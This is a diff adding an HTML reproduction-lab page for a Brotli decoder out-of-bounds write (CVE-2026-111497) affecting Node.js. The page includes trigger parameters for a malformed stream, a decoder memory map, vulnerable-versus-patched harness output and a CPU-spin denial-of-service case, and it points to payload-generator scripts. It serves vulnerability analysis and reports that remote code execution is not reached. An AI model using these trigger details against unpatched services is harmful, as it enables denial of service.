@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Node2Shell · CVE-2026-111497 — reproduction lab</title>
+<style>
+  :root{
+    --bg:#0b0d12; --panel:#131722; --panel2:#1a2030; --ink:#e6e9f2; --dim:#8b93a7;
+    --line:#2a3244; --hot:#ff5d5d; --warn:#ffb454; --ok:#3ddc84; --info:#5cc8ff;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);
+       font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;padding:28px 20px 60px}
+  .wrap{max-width:1080px;margin:0 auto}
+  h1{font-size:26px;margin:0 0 4px;letter-spacing:-.02em}
+  h1 small{color:var(--dim);font-weight:400;font-size:14px}
+  h2{font-size:16px;margin:0;letter-spacing:.01em}
+  h3{font-size:13px;margin:0 0 8px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em}
+  .sub{color:var(--dim);margin:0 0 22px;font-size:14px}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px;margin:0 0 18px}
+  .panel > header{display:flex;align-items:baseline;gap:10px;margin-bottom:14px;flex-wrap:wrap}
+  .panel > header .note{color:var(--dim);font-size:12.5px}
+  code,.mono{font-family:var(--mono)}
+  .badges{display:flex;gap:8px;flex-wrap:wrap;margin:0 0 20px}
+  .badge{font-family:var(--mono);font-size:12px;padding:5px 10px;border-radius:999px;
+         border:1px solid var(--line);background:var(--panel)}
+  .badge.ok{border-color:#1d5b38;background:#0f2419;color:#9ff0bf}
+  .badge.no{border-color:#5c2525;background:#2a1414;color:#ffb0b0}
+  .badge.mid{border-color:#5c4a1d;background:#241d0f;color:#ffd79f}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  @media(max-width:820px){.grid2{grid-template-columns:1fr}}
+  table{width:100%;border-collapse:collapse;font-size:13.5px}
+  th,td{text-align:left;padding:7px 9px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--dim);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em}
+  td.num,th.num{text-align:right;font-family:var(--mono)}
+  pre{margin:0;background:#0a0c11;border:1px solid var(--line);border-radius:8px;padding:12px;
+      overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.5;color:#c9d3e6}
+  pre .c{color:var(--dim)} pre .g{color:var(--ok)} pre .r{color:var(--hot)} pre .y{color:var(--warn)}
+  pre .b{color:var(--info)}
+  .row{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin:10px 0}
+  .row label{font-size:13px;color:var(--dim);min-width:132px}
+  input[type=range]{flex:1;min-width:180px;accent-color:var(--info)}
+  .val{font-family:var(--mono);font-size:13px;color:var(--ink);min-width:64px;text-align:right}
+  button{font:inherit;font-size:13px;padding:7px 14px;border-radius:8px;border:1px solid var(--line);
+         background:var(--panel2);color:var(--ink);cursor:pointer}
+  button:hover{border-color:#3c4761}
+  button.on{background:#12314a;border-color:#2b6d99}
+  .kv{display:grid;grid-template-columns:auto 1fr;gap:6px 14px;font-size:13.5px;align-items:baseline}
+  .kv .k{color:var(--dim)}
+  .kv .v{font-family:var(--mono)}
+  /* ---- memory map ---- */
+  .map{position:relative;margin:6px 0 4px}
+  .track{position:relative;height:150px;background:#0a0c11;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+  .fld{position:absolute;top:0;bottom:0;border-right:1px solid #0a0c11;display:flex;flex-direction:row;
+       align-items:flex-end;justify-content:center;gap:3px;padding:4px 1px}
+  .fld b{font-family:var(--mono);font-size:11px;font-weight:600;white-space:nowrap;
+         writing-mode:vertical-rl;transform:rotate(180deg);letter-spacing:.02em}
+  .fld span{font-family:var(--mono);font-size:10px;color:var(--dim);white-space:nowrap;
+            writing-mode:vertical-rl;transform:rotate(180deg);margin-bottom:2px}
+  .fld.buf{background:#233047} .fld.len{background:#3c2430} .fld.live{background:#2c2233}
+  .fld.ptr{background:#12283a} .fld.other{background:#1a1f2c} .fld.pad{background:#12151d}
+  .fld.hit{box-shadow:inset 0 0 0 2px var(--hot);background:#4a1f1f}
+  .fld.touched{box-shadow:inset 0 0 0 2px var(--warn)}
+  .ovl{position:absolute;top:0;bottom:0;background:rgba(255,93,93,.22);border-left:1px solid var(--hot);
+       border-right:1px solid var(--hot);pointer-events:none}
+  .ceil{position:absolute;top:-2px;bottom:-2px;width:0;border-left:2px dashed var(--warn);pointer-events:none}
+  .ceiltag{position:absolute;top:-19px;color:var(--warn);font-family:var(--mono);font-size:11px;white-space:nowrap;transform:translateX(-50%)}
+  .unreach{position:absolute;top:0;bottom:0;background:rgba(255,93,93,.07);
+           border-left:1px dashed #5c2525;pointer-events:none}
+  .unreachtag{position:absolute;top:4px;color:#ff9d9d;font-family:var(--mono);font-size:10.5px;
+              padding:1px 5px;background:rgba(42,20,20,.92);border:1px solid #5c2525;border-radius:5px;
+              white-space:nowrap}
+  .axis{position:relative;height:16px;font-family:var(--mono);font-size:10.5px;color:var(--dim)}
+  .axis i{position:absolute;transform:translateX(-50%);font-style:normal}
+  .bar{height:10px;border-radius:6px;background:#0a0c11;border:1px solid var(--line);overflow:hidden}
+  .bar > i{display:block;height:100%;background:linear-gradient(90deg,#2b6d99,#5cc8ff)}
+  .bar.ok > i{background:linear-gradient(90deg,#1d5b38,#3ddc84)}
+  .bar.hot > i{background:linear-gradient(90deg,#7a2b2b,#ff5d5d)}
+  .legend{display:flex;gap:14px;flex-wrap:wrap;font-size:12px;color:var(--dim);margin-top:8px}
+  .legend i{display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:5px;vertical-align:-1px}
+  .tl{position:relative;height:74px;margin:8px 0 0}
+  .tl .line{position:absolute;left:0;right:0;top:34px;height:2px;background:var(--line)}
+  .tl .pt{position:absolute;top:26px;width:14px;height:14px;border-radius:50%;background:#0b0d12;border:3px solid var(--info);transform:translateX(-50%)}
+  .tl .pt.fix{border-color:var(--ok)} .tl .pt.rel{border-color:var(--warn)} .tl .pt.pub{border-color:var(--hot)}
+  .tl .lb{position:absolute;top:2px;font-family:var(--mono);font-size:11px;color:var(--dim);transform:translateX(-50%);text-align:center;white-space:nowrap}
+  .tl .lb2{position:absolute;top:46px;font-family:var(--mono);font-size:11px;transform:translateX(-50%);white-space:nowrap}
+  .gap{position:absolute;top:30px;height:10px;background:repeating-linear-gradient(45deg,#2a3244,#2a3244 6px,#1a2030 6px,#1a2030 12px);border-radius:5px}
+  .gap span{position:absolute;left:50%;top:-1px;transform:translate(-50%,-100%);font-family:var(--mono);font-size:11px;color:var(--warn)}
+  footer{color:var(--dim);font-size:13px;text-align:center;margin-top:26px}
+  a{color:var(--info)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>Node2Shell — CVE-2026-111497 <small>independent reproduction lab</small></h1>
+  <p class="sub">Out-of-bounds write in the Brotli decoder's internal input buffer · Brotli C library
+     1.0.3–&lt;1.0.10, 1.1.0–&lt;1.1.1, 1.2.0–&lt;1.2.1 · fixed in 1.0.10 / 1.1.1 / 1.2.1 and
+     Node.js 22.23.4 / 24.22.1 / 26.12.1. Everything below is measured on local builds of
+     Brotli&nbsp;1.2.0 and 1.2.1, not quoted from third-party tooling.</p>
+
+  <div class="badges">
+    <span class="badge ok">trigger ✓ reproduced</span>
+    <span class="badge ok">OOB write ✓ reproduced (16 B past the 8-byte buffer)</span>
+    <span class="badge no">pointer control ✗ unreachable (ceiling: offset 98)</span>
+    <span class="badge no">RCE ✗ not reproduced</span>
+    <span class="badge mid">DoS ✓ 100 % CPU spin, one call never returns</span>
+    <span class="badge mid">patch A/B ✓ −17 FORMAT_BLOCK_SWITCH</span>
+  </div>
+
+  <!-- ============ 1. TRIGGER ============ -->
+  <div class="panel">
+    <header><h2>1 · The trigger</h2>
+      <span class="note">why draining a 2²⁴ counter needed a zero-cost command</span></header>
+
+    <p style="margin:0 0 12px;font-size:14px;color:#c9d3e6">
+      The bug fires when a block-length counter reaches 0 while the meta-block declared only one
+      block type. <code>BrotliDecoderStateMetablockBegin()</code> resets every counter to
+      <code>2²⁴</code> at the start of <em>each</em> meta-block, so the drain has to happen inside
+      one meta-block — and a negative <code>meta_block_remaining_len</code> is rejected by
+      <code>WriteRingBuffer</code>, so the drain may not cost anything. A static-dictionary copy
+      whose transform returns 0 does exactly that:
+      <code>BrotliTransformDictionaryWord()</code> returns <code>idx</code> (bytes written), not the
+      transformed length, and transform 34 (<code>OMIT_FIRST_4</code>, empty affixes) returns 0.
+    </p>
+
+    <pre><span class="c">/* per command: insert 0, copy 4, explicit distance */</span>
+pos += len;                          <span class="g">/* +0  */</span>
+s-&gt;meta_block_remaining_len -= len;   <span class="g">/* -0  */</span>
+--s-&gt;block_length[1];                 <span class="b">/* the counter we are draining */</span>
+--s-&gt;block_length[2];                 <span class="b">/* ...and the distance counter too  */</span></pre>
+
+    <div class="row" style="margin-top:14px">
+      <button id="run">▶ run the drain</button>
+      <button id="step">step</button>
+      <button id="reset">reset</button>
+      <span class="note" id="note" style="color:var(--dim);font-size:12.5px">animation is time-scaled; the real loop runs 16 777 216 iterations</span>
+    </div>
+
+    <div class="grid2" style="margin-top:12px">
+      <div>
+        <h3>block_length[1] — drained</h3>
+        <div class="bar hot"><i id="b1" style="width:100%"></i></div>
+        <div class="kv" style="margin-top:10px">
+          <span class="k">block_length[1]</span><span class="v" id="v_b1">16 777 216</span>
+          <span class="k">commands issued</span><span class="v" id="v_cmd">0</span>
+          <span class="k">bits consumed</span><span class="v" id="v_bits">0 B</span>
+        </div>
+      </div>
+      <div>
+        <h3>what the drain must <em>not</em> touch</h3>
+        <div class="bar ok"><i id="bmlr" style="width:100%"></i></div>
+        <div class="kv" style="margin-top:10px">
+          <span class="k">meta_block_remaining_len</span><span class="v" id="v_mlr">1 · unchanged</span>
+          <span class="k">output produced</span><span class="v" id="v_out">0 B</span>
+          <span class="k">pos / max_distance</span><span class="v">0 / 0</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="margin-top:16px">
+      <tr><th>parameter</th><th>value</th><th>why</th></tr>
+      <tr><td>transform</td><td class="num">34</td><td><code>OMIT_FIRST_4</code>, empty prefix <em>and</em> suffix → returns 0 for a 4-byte word</td></tr>
+      <tr><td>copy length</td><td class="num">4</td><td><code>i ≥ 4</code> is required to enter the dictionary word path</td></tr>
+      <tr><td>distance</td><td class="num">34818</td><td>= ((34 ≪ 10) + 1) + 1, pins <code>transform_idx</code> at 34 while <code>max_distance</code> is 0</td></tr>
+      <tr><td>distance postfix</td><td class="num">3</td><td>alphabet 400; spreads each extra bit over 8 distances → <b>11 bits per command</b></td></tr>
+      <tr><td>commands</td><td class="num">2²⁴ × 11 bit</td><td>= 23 068 672 bytes of payload, enough to drain exactly once</td></tr>
+      <tr><td>MLEN</td><td class="num">1</td><td>nothing is produced, so nothing is consumed</td></tr>
+    </table>
+  </div>
+
+  <!-- ============ 2. MEMORY MAP ============ -->
+  <div class="panel">
+    <header><h2>2 · Where the write actually lands</h2>
+      <span class="note">the write index <em>is</em> the <code>buffer_length</code> field — but the ceiling is not</span></header>
+
+    <p style="margin:0 0 6px;font-size:14px;color:#c9d3e6">
+      An attacker byte at index <code>i</code> lands at decoder-state offset <code>72 + i</code>.
+      <code>BROTLI_FAST_INPUT_SLACK = 28</code> means both fill loops only run while fewer than 28
+      input bytes remain, so at most 27 bytes are ever written. Drag the slider — this is the
+      measured behaviour, not a sketch.
+    </p>
+
+    <div class="row">
+      <label for="tail">tail length N</label>
+      <input id="tail" type="range" min="0" max="30" value="24">
+      <span class="val" id="vtail">24 B</span>
+    </div>
+    <div class="row" style="margin-top:-2px">
+      <label for="hijack">index hijack</label>
+      <button id="hijack">aim the second write at offset 136</button>
+      <span class="note" style="color:var(--dim);font-size:12.5px">write <code>3F</code> at index 8 so the next index becomes 64</span>
+    </div>
+
+    <div class="map">
+      <div class="ceiltag" id="ceiltag">ceiling · 27 B</div>
+      <div class="track" id="track"></div>
+      <div class="axis">
+        <i style="left:0%">0</i><i style="left:25%">44</i><i style="left:50%">88</i>
+        <i style="left:75%">132</i><i style="left:100%">176</i>
+      </div>
+    </div>
+    <div class="legend">
+      <span><i style="background:#233047"></i>input buffer (8 B)</span>
+      <span><i style="background:#3c2430"></i>buffer_length (write index)</span>
+      <span><i style="background:#2c2233"></i>live decoder fields</span>
+      <span><i style="background:#12283a"></i>pointers</span>
+      <span><i style="background:#4a1f1f"></i>written by the OOB</span>
+      <span><i style="background:#12151d"></i>padding</span>
+    </div>
+
+    <div class="grid2" style="margin-top:16px">
+      <div>
+        <h3>verdict for N = <span id="vN">24</span></h3>
+        <div id="clobber" class="kv"></div>
+      </div>
+      <div>
+        <h3>the three pointer fields, as measured</h3>
+        <pre id="ptrs"><span class="c">before → after the OOB write</span>
+ringbuffer     0x51b000000080 → <span class="g">0x51b000000080</span>
+ringbuffer_end 0x51b000000480 → <span class="g">0x51b000000480</span>
+htree_command  0x521000002908 → <span class="g">0x521000002908</span>
+</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 3. A/B ============ -->
+  <div class="panel">
+    <header><h2>3 · Vulnerable vs patched — same bytes, same chunking</h2>
+      <span class="note">the payload is byte-identical; only the decoder differs</span></header>
+
+    <div class="row">
+      <button id="arm1" class="on">payload + 24-byte tail, one chunk</button>
+      <button id="arm2">payload + 8-byte tail, then a second chunk</button>
+    </div>
+
+    <div class="grid2" style="margin-top:12px">
+      <div>
+        <h3 style="color:#ffb0b0">Brotli 1.2.0 — vulnerable</h3>
+        <pre id="pre_v"></pre>
+      </div>
+      <div>
+        <h3 style="color:#9ff0bf">Brotli 1.2.1 — patched</h3>
+        <pre id="pre_p"></pre>
+      </div>
+    </div>
+    <p id="armnote" style="margin:12px 0 0;font-size:13.5px;color:#c9d3e6"></p>
+  </div>
+
+  <!-- ============ 4. TIMELINE ============ -->
+  <div class="panel">
+    <header><h2>4 · The window that mattered</h2>
+      <span class="note">fixed upstream in February, released in October</span></header>
+    <div class="tl">
+      <div class="line"></div>
+      <div class="gap" style="left:6%;width:74%"><span>8 months unreleased</span></div>
+      <div class="pt fix" style="left:6%"></div>
+      <div class="lb" style="left:6%">2026-02-27</div>
+      <div class="lb2" style="left:6%;color:#9ff0bf">fix committed<br>0ed4268</div>
+      <div class="pt rel" style="left:80%"></div>
+      <div class="lb" style="left:80%">2026-10-21</div>
+      <div class="lb2" style="left:80%;color:#ffd79f">1.0.10 / 1.1.1 / 1.2.1<br>Node 22.23.4 · 24.22.1</div>
+      <div class="pt pub" style="left:94%"></div>
+      <div class="lb" style="left:94%">2026-10-22</div>
+      <div class="lb2" style="left:94%;color:#ffb0b0">CVE published<br>+ Imperva post</div>
+    </div>
+    <p style="margin:22px 0 0;font-size:13.5px;color:#c9d3e6">
+      The release that carried the fix added <b>no regression test</b> and <b>no CHANGELOG entry</b>,
+      so the malformed-stream shape had to be reconstructed from the code — which is what the
+      payload generator in this repo does.
+    </p>
+    <table style="margin-top:14px">
+      <tr><th>reading</th><th>NVD / CNA</th><th>Node.js</th><th>Imperva</th></tr>
+      <tr><td>severity</td><td class="num">9.2 CRITICAL</td><td class="num">HIGH</td><td class="num">HIGH</td></tr>
+      <tr><td>reported by</td><td class="num">—</td><td>OpenAI Codex Security<br>(Khai Tran, Sylvie Mayer)</td><td>Matteo Collina</td></tr>
+      <tr><td>fixed by</td><td class="num">—</td><td>mcollina, aduh95</td><td>Antoine du Hamel</td></tr>
+    </table>
+  </div>
+
+  <footer>
+    Reproduce: <code>scripts/setup.sh</code> → <code>payload/gen_payload.py --variant cmd-drain</code> →
+    <code>./run_ab.sh payload/payloads/cmd-drain-t24.br</code> ·
+    <a href="../docs/REPORT.md">docs/REPORT.md</a> · <a href="../docs/NOTES.md">docs/NOTES.md</a>
+  </footer>
+</div>
+
+<script>
+"use strict";
+const CAP = 1 << 24, BITS = 11, SLACK = 28;
+const fmt = n => n.toLocaleString("en-US");
+
+/* ---------- 1. trigger animation ---------- */
+const T = { f: 0, timer: null };
+function paintTrigger() {
+  const f = T.f, cmd = Math.floor(CAP * f), bl1 = Math.max(0, CAP - cmd);
+  document.getElementById("b1").style.width = (100 * bl1 / CAP) + "%";
+  document.getElementById("v_b1").textContent = fmt(bl1);
+  document.getElementById("v_cmd").textContent = fmt(cmd);
+  const bytes = Math.round(cmd * BITS / 8);
+  document.getElementById("v_bits").textContent = fmt(bytes) + " B" + (f >= 1 ? "  ← 23.07 MB" : "");
+  document.getElementById("v_mlr").textContent = "1 · unchanged";
+  document.getElementById("v_out").textContent = "0 B";
+  document.getElementById("bmlr").style.width = "100%";
+  if (f >= 1) document.getElementById("note").textContent =
+    "block_length[1] == 0 with num_block_types[1] == 1 → the drained check now fires";
+}
+document.getElementById("run").onclick = () => {
+  clearInterval(T.timer);
+  T.timer = setInterval(() => { T.f = Math.min(1, T.f + 0.012); paintTrigger();
+    if (T.f >= 1) clearInterval(T.timer); }, 16);
+};
+document.getElementById("step").onclick = () => { T.f = Math.min(1, T.f + 0.25); paintTrigger(); };
+document.getElementById("reset").onclick = () => { clearInterval(T.timer); T.f = 0; paintTrigger();
+  document.getElementById("note").textContent = "animation is time-scaled; the real loop runs 16 777 216 iterations"; };
+paintTrigger();
+
+/* ---------- 2. memory map ---------- */
+// offsets from offsetof() on the vendor's own state.h
+const FIELDS = [
+  { o:0,   n:8,  name:"…",                 cls:"other", pad:true },
+  { o:72,  n:8,  name:"buffer.u8[8]",      cls:"buf"  },
+  { o:80,  n:8,  name:"buffer_length",     cls:"len"  },
+  { o:88,  n:4,  name:"pos",               cls:"live" },
+  { o:92,  n:4,  name:"—",                 cls:"pad", pad:true },
+  { o:96,  n:4,  name:"max_distance",      cls:"live" },
+  { o:100, n:4,  name:"ringbuffer_size",   cls:"live" },
+  { o:104, n:4,  name:"ringbuffer_mask",   cls:"live" },
+  { o:108, n:4,  name:"—",                 cls:"pad", pad:true },
+  { o:112, n:16, name:"dist_rb[4]",        cls:"live" },
+  { o:128, n:4,  name:"—",                 cls:"pad", pad:true },
+  { o:132, n:4,  name:"mlr",               cls:"live" },
+  { o:136, n:8,  name:"ringbuffer",        cls:"ptr"  },
+  { o:144, n:8,  name:"ringbuffer_end",    cls:"ptr"  },
+  { o:152, n:8,  name:"htree_command",     cls:"ptr"  },
+  { o:160, n:16, name:"…",                 cls:"other", pad:true }
+];
+const SPAN = 176, MAXW = 29;   // slider max: 29 so the "just past the ceiling" case is visible
+const P = o => (100 * o / SPAN);
+
+let hijack = false, N = 24;
+function buildTrack() {
+  const track = document.getElementById("track");
+  track.innerHTML = "";
+  FIELDS.forEach(f => {
+    const d = document.createElement("div");
+    d.className = "fld " + f.cls;
+    d.style.left = P(f.o) + "%";
+    d.style.width = P(f.n) + "%";
+    d.dataset.o = f.o; d.dataset.n = f.n;
+    if (!f.pad) d.innerHTML = "<b>" + f.name + "</b><span>+" + f.o + "</span>";
+    track.appendChild(d);
+  });
+  const unreach = document.createElement("div");
+  unreach.className = "unreach";
+  unreach.style.left = P(99) + "%"; unreach.style.width = (100 - P(99)) + "%";
+  track.appendChild(unreach);
+  const tag = document.createElement("div");
+  tag.className = "unreachtag"; tag.style.left = P(101) + "%";
+  tag.textContent = "unreachable — the input-buffer OOB cannot pass offset 98";
+  track.appendChild(tag);
+  const ovl = document.createElement("div");
+  ovl.className = "ovl"; ovl.id = "ovl"; track.appendChild(ovl);
+  const ceil = document.createElement("div");
+  ceil.className = "ceil"; ceil.style.left = P(99) + "%"; ceil.id = "ceilline";
+  track.appendChild(ceil);
+}
+function paintMap() {
+  const n = Math.min(N, MAXW);
+  const hi = 71 + Math.min(n, 27);                 // highest offset written
+  const ovl = document.getElementById("ovl");
+  ovl.style.left = P(72) + "%"; ovl.style.width = Math.max(0, P(hi + 1) - P(72)) + "%";
+  document.getElementById("ceiltag").style.left = P(99) + "%";
+  document.getElementById("ceiltag").textContent =
+    n <= 27 ? "ceiling · " + n + " B written" : "N > 27 — not achievable (fast-path slack)";
+  document.querySelectorAll(".fld").forEach(d => {
+    const o = +d.dataset.o, len = +d.dataset.n;
+    d.classList.remove("hit", "touched");
+    if (o + len <= 72) return;
+    if (o <= hi && o >= 72) d.classList.add("hit");
+    else if (o < 72 && o + len > 72) d.classList.add("hit");
+  });
+  if (hijack) document.querySelectorAll('.fld.len').forEach(d => d.classList.add("touched"));
+
+  const rows = [];
+  const reach = (off) => off <= 71 + n;             // written iff within the span
+  rows.push(["tail bytes copied", n + " B → offsets 72…" + hi, "g"]);
+  rows.push(["buffer.u8[] intended size", "8 B (offsets 72–79)", ""]);
+  rows.push(["buffer_length @80", reach(87) ? "written, but RESTORED to " + n
+            + " by the register store → index cannot be hijacked" : "not reached", reach(87) ? "y" : ""]);
+  rows.push(["pos @88", reach(91) ? "CLOBBERED (4 B, attacker bytes)" : "not reached", reach(91) ? "r" : ""]);
+  rows.push(["max_distance @96", reach(99) ? "CLOBBERED (partial)" : "not reached — needs N ≥ 25", reach(99) ? "r" : ""]);
+  rows.push(["ringbuffer @136", "NOT REACHABLE (needs N ≥ 65, slack allows ≤ 27)", "r"]);
+  rows.push(["ringbuffer_end @144", "NOT REACHABLE", "r"]);
+  rows.push(["htree_command @152", "NOT REACHABLE", "r"]);
+  document.getElementById("clobber").innerHTML = rows.map(r =>
+    '<span class="k">' + r[0] + '</span><span class="v" style="color:' +
+    (r[2] === "r" ? "#ffb0b0" : r[2] === "y" ? "#ffd79f" : r[2] === "g" ? "#9ff0bf" : "var(--ink)") +
+    '">' + r[1] + '</span>').join("");
+  document.getElementById("vN").textContent = n;
+  const ptr = document.getElementById("ptrs");
+  ptr.innerHTML = hijack
+    ? '<span class="c">index-hijack attempt: byte 0x3F at index 8</span>\n' +
+      'ringbuffer     0x51b000000080 → <span class="y">0x51b000000080</span>  <span class="c">unchanged</span>\n' +
+      'buffer_length  24 → <span class="y">24</span>  <span class="c">register store restored it</span>\n' +
+      '<span class="r">the jump to index 64 never happens — measured</span>'
+    : '<span class="c">before → after the OOB write (measured)</span>\n' +
+      'ringbuffer     0x51b000000080 → <span class="g">0x51b000000080</span>\n' +
+      'ringbuffer_end 0x51b000000480 → <span class="g">0x51b000000480</span>\n' +
+      'htree_command  0x521000002908 → <span class="g">0x521000002908</span>';
+}
+document.getElementById("tail").oninput = e => {
+  N = +e.target.value;
+  document.getElementById("vtail").textContent = N + " B";
+  paintMap();
+};
+document.getElementById("hijack").onclick = e => {
+  hijack = !hijack; e.target.classList.toggle("on", hijack);
+  e.target.textContent = hijack ? "index hijack attempted (measured: ineffective)" : "aim the second write at offset 136";
+  paintMap();
+};
+buildTrack(); paintMap();
+
+/* ---------- 3. A/B ---------- */
+const ARMS = [
+{ v:'<span class="c">$ ./harness-1.2.0 cmd-drain-t24.br</span>\n' +
+   'phase1 call=0 result=2 avail_in_left=0 out_bytes=0 buffer_length=24\n' +
+   '<span class="r">VERDICT=OOB_WRITE_PAST_8_BYTE_BUFFER buffer_length=24 (> 8)</span>\n' +
+   '  clobber_check (attacker bytes start at state offset 72):\n' +
+   '    buffer_length = 24 (0x18)\n' +
+   '    pos = -2105376126 (0x82828282)   <span class="r">← clobbered</span>\n' +
+   '    ringbuffer     = 0x51b000000080  <span class="g">← intact</span>\n' +
+   '    ringbuffer_end = 0x51b000000480  <span class="g">← intact</span>\n' +
+   '    htree_command  = 0x521000002908  <span class="g">← intact</span>\n' +
+   '<span class="r">&gt;&gt;&gt; 24 bytes written from s-&gt;buffer.u8[0] — 16 past the 8-byte buffer</span>',
+  p:'<span class="c">$ ./harness-1.2.1 cmd-drain-t24.br</span>\n' +
+   'phase1 call=0 result=0 avail_in_left=24 out_bytes=0 buffer_length=0\n' +
+   '<span class="g">VERDICT=FORMAT_ERROR error_code=-17 (_ERROR_FORMAT_BLOCK_SWITCH)</span>\n' +
+   '<span class="g">&gt;&gt;&gt; rejected as a permanent format error; nothing stashed</span>',
+  note:'One chunk. The vulnerable build reports a <b>transient</b> condition for a permanent one, ' +
+       'then stashes the whole unconsumed tail — 16 bytes past the 8-byte buffer. The patched build ' +
+       'returns the precise format error and copies nothing.' },
+{ v:'<span class="c">$ ./harness-1.2.0 --watchdog 120 cmd-drain-t8.br   (+ a second chunk)</span>\n' +
+   '<span class="r">VERDICT=NO_PROGRESS_SPIN</span>\n' +
+   'detail=decoder did not return from a single BrotliDecoderDecompressStream() call\n' +
+   'detail=caller would keep feeding input forever; the service burns CPU instead of crashing\n' +
+   '<span class="r">&gt;&gt;&gt; the drained state re-enters the invalid switch forever</span>',
+  p:'<span class="c">$ ./harness-1.2.1 cmd-drain-t8.br</span>\n' +
+   '<span class="g">VERDICT=FORMAT_ERROR error_code=-17 (_ERROR_FORMAT_BLOCK_SWITCH)</span>\n' +
+   '<span class="g">&gt;&gt;&gt; rejected before any looping can start</span>',
+  note:'Second chunk. Fewer than 28 unconsumed bytes at the drained check puts the decoder in the safe ' +
+       'path; the moment the fast path is armed again it loops without consuming input. That is the ' +
+       'DoS arm: a worker thread that never returns.' }
+];
+function arm(i) {
+  document.getElementById("pre_v").innerHTML = ARMS[i].v;
+  document.getElementById("pre_p").innerHTML = ARMS[i].p;
+  document.getElementById("armnote").innerHTML = ARMS[i].note;
+  document.getElementById("arm1").classList.toggle("on", i === 0);
+  document.getElementById("arm2").classList.toggle("on", i === 1);
+}
+document.getElementById("arm1").onclick = () => arm(0);
+document.getElementById("arm2").onclick = () => arm(1);
+arm(0);
+</script>
+</body>
+</html>
